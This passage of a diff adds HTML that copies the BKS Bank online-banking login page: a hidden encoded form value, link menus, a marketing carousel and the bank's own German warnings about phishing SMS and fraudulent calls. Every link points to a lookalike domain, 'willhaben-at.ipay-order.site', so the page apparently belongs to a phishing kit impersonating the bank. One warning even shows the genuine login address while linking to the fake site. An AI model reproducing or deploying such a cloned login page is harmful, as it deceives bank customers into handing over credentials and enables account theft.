+                        value="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"
+                        autocomplete="off"
+                      />
+                    </form>
+                  </div>
+                </section>
+              </div>
+            </div>
+          </div>
+          <script>
+            // TODO: REMOVE SCRIPT TAG FROM HERE
+            document.addEventListener("DOMContentLoaded", function () {
+              // init accordion
+              DbitComponents.AccordionHandler.register({
+                domId: "first-login-accordion",
+                activeTargetSelector: "#db-initial-login-btn",
+              });
+            });
+          </script>
+          <div
+            class="notifications-wrapper notifications-placeholder empty init-fix"
+          ></div>
+          <div class="tile-wrapper">
+            <article class="tile login-links bound">
+              <header class="vp">
+                <div class="vc-wrapper">
+                  <h1 class="vp vc"><span>Weiterführende Links</span></h1>
+                </div>
+              </header>
+              <div
+                class="tile-content accordion open no-shadow no-footer"
+                data-skip-scroll="true"
+                data-skip-shadow="true"
+              >
+                <div class="full-content">
+                  <div class="content jcarousel-wrapper">
+                    <div class="tile-nav vp" style="display: none">
+                      <span class="first vc" style="visibility: hidden"
+                        ><a
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                          class="jcarousel-control-prev"
+                          ><span
+                            class="db-icon-wrapper"
+                            data-test="db-icon-wrapper-slider_left"
+                            ><i class="dbit-icons" data-test="db-icon">
+                              slider_left</i
+                            ></span
+                          ></a
+                        ></span
+                      >
+                      <ul
+                        class="second vc jcarousel-pagination no-nav"
+                        data-jcarouselpagination="true"
+                      >
+                        <li class="vp active">
+                          <a
+                            class="vc"
+                            href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                          ></a>
+                        </li>
+                      </ul>
+                      <span class="third vc" style="visibility: hidden"
+                        ><a
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                          class="jcarousel-control-next"
+                          ><span
+                            class="db-icon-wrapper"
+                            data-test="db-icon-wrapper-slider_right"
+                            ><i class="dbit-icons" data-test="db-icon">
+                              slider_right</i
+                            ></span
+                          ></a
+                        ></span
+                      >
+                    </div>
+                    <div class="jcarousel" data-jcarousel="true">
+                      <ul
+                        style="
+                          transition-duration: 0s;
+                          transition-timing-function: ease;
+                          transition-property: all;
+                          transform: none;
+                          left: 0px;
+                          top: 0px;
+                        "
+                        class="no-nav"
+                      >
+                        <li class="jc-item jcarousel-visible">
+                          <ul class="no-nav">
+                            <li class="vp bg">
+                              <a
+                                href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                ><span class="vc">BKS Security (Download)</span
+                                ><span class="vc"
+                                  ><span
+                                    class="db-icon-wrapper"
+                                    data-test="db-icon-wrapper-"
+                                    ><i class="dbit-icons" data-test="db-icon">
+                                    </i></span></span
+                              ></a>
+                            </li>
+                            <li class="vp">
+                              <a
+                                href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                ><span class="vc"
+                                  >FAQ - oft gestellte Fragen</span
+                                ><span class="vc"
+                                  ><span
+                                    class="db-icon-wrapper"
+                                    data-test="db-icon-wrapper-"
+                                    ><i class="dbit-icons" data-test="db-icon">
+                                    </i></span></span
+                              ></a>
+                            </li>
+                            <li class="vp bg">
+                              <a
+                                href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                ><span class="vc">Servicenummern</span
+                                ><span class="vc"
+                                  ><span
+                                    class="db-icon-wrapper"
+                                    data-test="db-icon-wrapper-"
+                                    ><i class="dbit-icons" data-test="db-icon">
+                                    </i></span></span
+                              ></a>
+                            </li>
+                            <li class="vp">
+                              <a
+                                href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                ><span class="vc">Sicherheitsinformation</span
+                                ><span class="vc"
+                                  ><span
+                                    class="db-icon-wrapper"
+                                    data-test="db-icon-wrapper-"
+                                    ><i class="dbit-icons" data-test="db-icon">
+                                    </i></span></span
+                              ></a>
+                            </li>
+                            <li class="vp bg">
+                              <a
+                                href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                ><span class="vc"
+                                  >Fernwartung (Wartungstool)</span
+                                ><span class="vc"
+                                  ><span
+                                    class="db-icon-wrapper"
+                                    data-test="db-icon-wrapper-"
+                                    ><i class="dbit-icons" data-test="db-icon">
+                                    </i></span></span
+                              ></a>
+                            </li>
+                            <li class="vp border-rad">
+                              <a
+                                href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                ><span class="vc">Wertpapierinformationen</span
+                                ><span class="vc"
+                                  ><span
+                                    class="db-icon-wrapper"
+                                    data-test="db-icon-wrapper-"
+                                    ><i class="dbit-icons" data-test="db-icon">
+                                    </i></span></span
+                              ></a>
+                            </li>
+                          </ul>
+                        </li>
+                      </ul>
+                      <div class="clearfix"></div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </article>
+          </div>
+          <div class="tile-wrapper">
+            <article
+              class="tile marketing regular transparent-marketing-tile db-tile-marketing bound"
+            >
+              <div class="tile-content">
+                <div class="content">
+                  <div class="tile-nav vp">
+                    <span class="first vc" style="visibility: hidden"
+                      ><a
+                        href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                        class="jcarousel-control-prev"
+                        ><span
+                          class="db-icon-wrapper"
+                          data-test="db-icon-wrapper-slider_left"
+                          ><i class="dbit-icons" data-test="db-icon">
+                            slider_left</i
+                          ></span
+                        ></a
+                      ></span
+                    >
+                    <ul
+                      class="second vc jcarousel-pagination"
+                      data-jcarouselpagination="true"
+                    >
+                      <li class="vp active">
+                        <a
+                          class="vc"
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                        ></a>
+                      </li>
+                      <li class="vp">
+                        <a
+                          class="vc"
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                        ></a>
+                      </li>
+                      <li class="vp">
+                        <a
+                          class="vc"
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                        ></a>
+                      </li>
+                      <li class="vp">
+                        <a
+                          class="vc"
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                        ></a>
+                      </li>
+                    </ul>
+                    <span class="third vc" style="visibility: visible"
+                      ><a
+                        href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                        class="jcarousel-control-next"
+                        ><span
+                          class="db-icon-wrapper"
+                          data-test="db-icon-wrapper-slider_right"
+                          ><i class="dbit-icons" data-test="db-icon">
+                            slider_right</i
+                          ></span
+                        ></a
+                      ></span
+                    >
+                  </div>
+                  <div
+                    class="jcarousel autoscroll"
+                    data-jcarousel="true"
+                    data-jcarouselautoscroll="true"
+                  >
+                    <ul
+                      style="
+                        transition-duration: 0.4s;
+                        transition-timing-function: ease;
+                        transition-property: left;
+                        transform: none;
+                        left: 0px;
+                        top: 0px;
+                      "
+                    >
+                      <li class="jc-item jcarousel-visible border">
+                        <a
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                          ><img
+                            src="/bks_files/login.jfif"
+                            height="306"
+                            width="300"
+                        /></a>
+                      </li>
+                      <li class="jc-item">
+                        <a
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                          ><img
+                            src="/bks_files/login(2)"
+                            height="306"
+                            width="300"
+                        /></a>
+                      </li>
+                      <li class="jc-item">
+                        <a
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                          ><img
+                            src="/bks_files/login(3)"
+                            height="306"
+                            width="300"
+                        /></a>
+                      </li>
+                      <li class="jc-item">
+                        <a
+                          href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                          ><img
+                            src="/bks_files/login(4)"
+                            height="306"
+                            width="300"
+                        /></a>
+                      </li>
+                    </ul>
+                    <div class="clearfix"></div>
+                  </div>
+                </div>
+              </div>
+            </article>
+          </div>
+          <div class="tile-wrapper">
+            <article class="tile ghost"></article>
+          </div>
+          <div class="tile-wrapper">
+            <article class="tile ghost"></article>
+          </div>
+        </div>
+        <div class="notifications-wrapper notifications-start">
+          <div id="_loginportlet_WAR_loginportlet_:notificationsArea">
+            <h2>Aktuelle Informationen</h2>
+            <div class="row">
+              <div class="col-xs-12">
+                <table id="notifciations-table" class="db-table">
+                  <tbody class="db-tbody">
+                    <tr
+                      class="db-trow js-notifications-row"
+                      id="js-login-cms-notifications-accordion-1022286124-row"
+                      onclick="DbitComponents.AccordionHandler.toggleAccordion({                                     uniqueId: &#39;js-login-cms-notifications-accordion-1022286124&#39;,                                     callbacks: {                                         afterOpen: function(){DBIT.Login.markNotificationRead(1022286124);}                                     }                                 })"
+                    >
+                      <td
+                        class="db-tcol db-mobile-full-height db-table-accordion-indicator js-db-mobile-full-height"
+                      >
+                        <span
+                          class="db-icon-wrapper"
+                          data-test="db-icon-wrapper-"
+                          ><i class="dbit-icons" data-test="db-icon"> </i
+                        ></span>
+                      </td>
+                      <td
+                        class="db-tcol js-notification-headline db-fw-bolder"
+                        data-notification-id="1022286124"
+                      >
+                        <div class="db-tcol-content">
+                          Warnhinweis: SMS-Betrüger fordern auf, Zahlungen an
+                          das Finanzamt zu leisten!
+                        </div>
+                      </td>
+                      <td class="db-tcol db-text-right">
+                        <div class="db-tcol-content">
+                          14.03.2023, 13:27&nbsp;Uhr
+                        </div>
+                      </td>
+                    </tr>
+                    <tr class="db-trow db-slidable-content db-accordion-row">
+                      <td
+                        class="db-tcol db-accordion-tcol db-slidable-content-table-wrapper"
+                        colspan="8"
+                      >
+                        <div
+                          id="_loginportlet_WAR_loginportlet_:j_idt848:0:jsf-accordion-wrapper"
+                        >
+                          <div
+                            class="db-accordion"
+                            id="js-login-cms-notifications-accordion-1022286124"
+                            data-test="db-accordion-js-login-cms-notifications-accordion-1022286124"
+                          >
+                            <div
+                              id="_loginportlet_WAR_loginportlet_:j_idt848:0:jsf-js-login-cms-notifications-accordion--rmc-update-all"
+                              class="db-accordion-body jsf-js-login-cms-notifications-accordion-1022286124-rmc-update-all"
+                              data-test="db-accordion-body"
+                            >
+                              <header
+                                class="db-accordion-header row"
+                                data-test="db-accordion-header"
+                              >
+                                <div
+                                  class="db-accordion-header-title col-xs-9 col-sm-7"
+                                  data-test="db-accordion-header-title"
+                                >
+                                  <h2 data-test="db-accordion-headline"></h2>
+                                </div>
+                                <div
+                                  class="db-accordion-header-actions col-xs-3 col-sm-5"
+                                  data-test="db-accordion-header-actions"
+                                >
+                                  <div
+                                    class="db-btn-group db-accordion-header-button-container db-right"
+                                    data-test="db-accordion-header-button-container"
+                                  >
+                                    <button
+                                      id="accordion-js-login-cms-notifications-accordion-1022286124-close"
+                                      type="button"
+                                      class="db-btn db-btn-icon primary db-primary db-mb-0 js-db-accordion-close-button"
+                                      name="accordion-js-login-cms-notifications-accordion-1022286124-close"
+                                      onclick="DbitComponents.AccordionHandler.closeAccordion({uniqueId: &#39;js-login-cms-notifications-accordion-1022286124&#39;})"
+                                      aria-label="Schließen"
+                                      data-test="db-btn-ONE_FIVE_CLOSE"
+                                      title="Schließen"
+                                    >
+                                      <span
+                                        class="db-icon-wrapper"
+                                        data-test="db-icon-wrapper-close"
+                                        ><i
+                                          class="dbit-icons"
+                                          data-test="db-icon"
+                                        >
+                                          close</i
+                                        ></span
+                                      >
+                                    </button>
+                                  </div>
+                                </div>
+                              </header>
+                              <section
+                                class="db-accordion-content row"
+                                data-test="db-accordion-content"
+                              >
+                                <div class="col-xs-12">
+                                  <p class="bold db-m-0">
+                                    Warnhinweis: SMS-Betrüger fordern auf,
+                                    Zahlungen an das Finanzamt zu leisten!
+                                  </p>
+                                  <p>
+                                    Aktuell sind in Österreich Phishing
+                                    SMS-Nachrichten im Namen des Finanzamts im
+                                    Umlauf. Dabei handelt es sich um eine groß
+                                    angelegte Betrugsmasche.<br />
+                                    In den SMS-Nachrichten werden die Empfänger
+                                    dazu aufgefordert eine Zahlung an das
+                                    Finanzamt zu tätigen.
+                                  </p>
+                                  <p>
+                                    Der in der SMS-Nachricht enthaltene Link
+                                    führt auf eine gefälschte Webseite von
+                                    FinanzOnline, dem Onlineportal des
+                                    Bundesministeriums für Finanzen (BMF). Auf
+                                    dieser gefälschten Website wird man zur
+                                    Eingabe von persönlichen Daten, unter
+                                    anderem der Kontonummer (IBAN),
+                                    aufgefordert.<br /><br />
+                                    Das Finanzamt warnt auch auf Ihrer<a
+                                      href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                      ><span style="color: #e50051">
+                                        Webseite</span
+                                      ></a
+                                    >
+                                    vor diesen SMS.
+                                  </p>
+                                  <img
+                                    alt=""
+                                    src="/bks_files/login(5)"
+                                    style="width: 350px; height: 335px"
+                                  /><br />
+                                  &nbsp;
+                                  <p>
+                                    Wenn Sie diese SMS-Nachricht erhalten,
+                                    beachten Sie bitte folgendes:
+                                  </p>
+                                  <ul>
+                                    <li>
+                                      Klicken Sie keinesfalls auf in der
+                                      SMS-Nachricht enthaltene Links oder
+                                      Dateien.
+                                    </li>
+                                    <li>
+                                      Geben Sie unter keinen Umständen
+                                      persönliche Daten wie Passwörter,
+                                      Kreditkartendaten oder Kontoinformationen
+                                      bekannt.
+                                    </li>
+                                    <li>
+                                      Wir empfehlen Ihnen, verdächtige
+                                      SMS-Nachrichten sofort zu löschen und den
+                                      Absender zu blockieren.
+                                    </li>
+                                    <li>
+                                      Führen Sie keine derartigen Zahlungen ohne
+                                      vorheriger Rücksprache mit Ihrem
+                                      Kundenbetreuer durch.
+                                    </li>
+                                  </ul>
+                                  <p>
+                                    Falls Sie Fragen haben oder weitere
+                                    Informationen wünschen, steht Ihnen Ihr
+                                    Kundenbetreuer oder unser
+                                    Kundenservice-Center unter der T: 0463 /
+                                    5858 640 zur Verfügung.
+                                  </p>
+                                  <p>
+                                    Weitere Informationen zum Thema Sicherheit
+                                    finden Sie auf unserer&nbsp;<a
+                                      href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                      ><span style="color: #e50051"
+                                        >Webseite</span
+                                      ></a
+                                    >.
+                                  </p>
+                                  <p>Ihre BKS Bank</p>
+                                </div>
+                              </section>
+                              <footer
+                                class="db-accordion-footer row"
+                                data-test="db-accordion-footer"
+                              ></footer>
+                            </div>
+                          </div>
+                          <script type="text/javascript">
+                            $(document).ready(function () {
+                              DbitComponents.AccordionHandler.unregister(
+                                "js-login-cms-notifications-accordion-1022286124"
+                              );
+                              DbitComponents.AccordionHandler.register({
+                                domId:
+                                  "js-login-cms-notifications-accordion-1022286124",
+                                activeTargetSelectors:
+                                  "#js-login-cms-notifications-accordion-1022286124-row",
+                                initialState: "closed",
+                                animationTimeScrolling: 500,
+                                scrollIntoView: true,
+                                activateDirtyCheck: false,
+                                tipsyId:
+                                  "js-db-accordion-close-tipsy-js-login-cms-notifications-accordion-1022286124",
+                              });
+                            });
+                          </script>
+                        </div>
+                      </td>
+                    </tr>
+                    <tr
+                      class="db-trow js-notifications-row"
+                      id="js-login-cms-notifications-accordion-956107294-row"
+                      onclick="DbitComponents.AccordionHandler.toggleAccordion({                                     uniqueId: &#39;js-login-cms-notifications-accordion-956107294&#39;,                                     callbacks: {                                         afterOpen: function(){DBIT.Login.markNotificationRead(956107294);}                                     }                                 })"
+                    >
+                      <td
+                        class="db-tcol db-mobile-full-height db-table-accordion-indicator js-db-mobile-full-height"
+                      >
+                        <span
+                          class="db-icon-wrapper"
+                          data-test="db-icon-wrapper-"
+                          ><i class="dbit-icons" data-test="db-icon"> </i
+                        ></span>
+                      </td>
+                      <td
+                        class="db-tcol js-notification-headline db-fw-bolder"
+                        data-notification-id="956107294"
+                      >
+                        <div class="db-tcol-content">
+                          Warnhinweis vor betrügerischen Anrufen!
+                        </div>
+                      </td>
+                      <td class="db-tcol db-text-right">
+                        <div class="db-tcol-content">
+                          09.12.2022, 13:36&nbsp;Uhr
+                        </div>
+                      </td>
+                    </tr>
+                    <tr class="db-trow db-slidable-content db-accordion-row">
+                      <td
+                        class="db-tcol db-accordion-tcol db-slidable-content-table-wrapper"
+                        colspan="8"
+                      >
+                        <div
+                          id="_loginportlet_WAR_loginportlet_:j_idt848:1:jsf-accordion-wrapper"
+                        >
+                          <div
+                            class="db-accordion"
+                            id="js-login-cms-notifications-accordion-956107294"
+                            data-test="db-accordion-js-login-cms-notifications-accordion-956107294"
+                          >
+                            <div
+                              id="_loginportlet_WAR_loginportlet_:j_idt848:1:jsf-js-login-cms-notifications-accordion--rmc-update-all"
+                              class="db-accordion-body jsf-js-login-cms-notifications-accordion-956107294-rmc-update-all"
+                              data-test="db-accordion-body"
+                            >
+                              <header
+                                class="db-accordion-header row"
+                                data-test="db-accordion-header"
+                              >
+                                <div
+                                  class="db-accordion-header-title col-xs-9 col-sm-7"
+                                  data-test="db-accordion-header-title"
+                                >
+                                  <h2 data-test="db-accordion-headline"></h2>
+                                </div>
+                                <div
+                                  class="db-accordion-header-actions col-xs-3 col-sm-5"
+                                  data-test="db-accordion-header-actions"
+                                >
+                                  <div
+                                    class="db-btn-group db-accordion-header-button-container db-right"
+                                    data-test="db-accordion-header-button-container"
+                                  >
+                                    <button
+                                      id="accordion-js-login-cms-notifications-accordion-956107294-close"
+                                      type="button"
+                                      class="db-btn db-btn-icon primary db-primary db-mb-0 js-db-accordion-close-button"
+                                      name="accordion-js-login-cms-notifications-accordion-956107294-close"
+                                      onclick="DbitComponents.AccordionHandler.closeAccordion({uniqueId: &#39;js-login-cms-notifications-accordion-956107294&#39;})"
+                                      aria-label="Schließen"
+                                      data-test="db-btn-ONE_FIVE_CLOSE"
+                                      title="Schließen"
+                                    >
+                                      <span
+                                        class="db-icon-wrapper"
+                                        data-test="db-icon-wrapper-close"
+                                        ><i
+                                          class="dbit-icons"
+                                          data-test="db-icon"
+                                        >
+                                          close</i
+                                        ></span
+                                      >
+                                    </button>
+                                  </div>
+                                </div>
+                              </header>
+                              <section
+                                class="db-accordion-content row"
+                                data-test="db-accordion-content"
+                              >
+                                <div class="col-xs-12">
+                                  <p class="bold db-m-0">
+                                    Warnhinweis vor betrügerischen Anrufen!
+                                  </p>
+
+                                  Aktuell gibt es wieder eine Welle von
+                                  betrügerischen Anrufen, die sich als
+                                  technischer Support ausgeben und zu einer
+                                  Freigabe einer Transaktion auffordern.<br /><br />
+                                  Kommen Sie dieser Aufforderung nicht nach und
+                                  kontaktieren Sie Ihren Betreuer oder unser
+                                  Kundenservice-Center unter der Tel.: 0463 /
+                                  5858&nbsp;<br /><br />
+                                  Bitte achten Sie auch bei Eingabe Ihrer
+                                  Einstiegsdaten ganz genau darauf, dass Sie
+                                  diese ausschließlich auf der Seite "<a
+                                    href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                    ><span style="color: #ff0000"
+                                      >https://www.bksbank-online.at/web/bks/login</span
+                                    ></a
+                                  >" vornehmen.<br /><br />
+                                  Weitere Informationen zum Thema Sicherheit
+                                  finden Sie auf unserer&nbsp;&nbsp;<a
+                                    href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                                    ><span style="color: #ff0000"
+                                      >Webseite</span
+                                    ></a
+                                  >.<br /><br />
+                                  Ihre BKS Bank
+                                </div>
+                              </section>
+                              <footer
+                                class="db-accordion-footer row"
+                                data-test="db-accordion-footer"
+                              ></footer>
+                            </div>
+                          </div>
+                          <script type="text/javascript">
+                            $(document).ready(function () {
+                              DbitComponents.AccordionHandler.unregister(
+                                "js-login-cms-notifications-accordion-956107294"
+                              );
+                              DbitComponents.AccordionHandler.register({
+                                domId:
+                                  "js-login-cms-notifications-accordion-956107294",
+                                activeTargetSelectors:
+                                  "#js-login-cms-notifications-accordion-956107294-row",
+                                initialState: "closed",
+                                animationTimeScrolling: 500,
+                                scrollIntoView: true,
+                                activateDirtyCheck: false,
+                                tipsyId:
+                                  "js-db-accordion-close-tipsy-js-login-cms-notifications-accordion-956107294",
+                              });
+                            });
+                          </script>
+                        </div>
+                      </td>
+                    </tr>
+                    <tr
+                      class="db-trow js-notifications-row"
+                      id="js-login-cms-notifications-accordion-972802394-row"
+                      onclick="DbitComponents.AccordionHandler.toggleAccordion({                                     uniqueId: &#39;js-login-cms-notifications-accordion-972802394&#39;,                                     callbacks: {                                         afterOpen: function(){DBIT.Login.markNotificationRead(972802394);}                                     }                                 })"
+                    >
+                      <td
+                        class="db-tcol db-mobile-full-height db-table-accordion-indicator js-db-mobile-full-height"
+                      >
+                        <span
+                          class="db-icon-wrapper"
+                          data-test="db-icon-wrapper-"
+                          ><i class="dbit-icons" data-test="db-icon"> </i
+                        ></span>
+                      </td>
+                      <td
+                        class="db-tcol js-notification-headline db-fw-bolder"
+                        data-notification-id="972802394"
+                      >
+                        <div class="db-tcol-content">
+                          Wichtige Information für FondsanlegerInnen
+                        </div>
+                      </td>
+                      <td class="db-tcol db-text-right">
+                        <div class="db-tcol-content">
+                          02.01.2023, 08:38&nbsp;Uhr
+                        </div>
+                      </td>
+                    </tr>
+                    <tr class="db-trow db-slidable-content db-accordion-row">
+                      <td
+                        class="db-tcol db-accordion-tcol db-slidable-content-table-wrapper"
+                        colspan="8"
+                      >
+                        <div
+                          id="_loginportlet_WAR_loginportlet_:j_idt848:2:jsf-accordion-wrapper"
+                        >
+                          <div
+                            class="db-accordion"
+                            id="js-login-cms-notifications-accordion-972802394"
+                            data-test="db-accordion-js-login-cms-notifications-accordion-972802394"
+                          >
+                            <div
+                              id="_loginportlet_WAR_loginportlet_:j_idt848:2:jsf-js-login-cms-notifications-accordion--rmc-update-all"
+                              class="db-accordion-body jsf-js-login-cms-notifications-accordion-972802394-rmc-update-all"
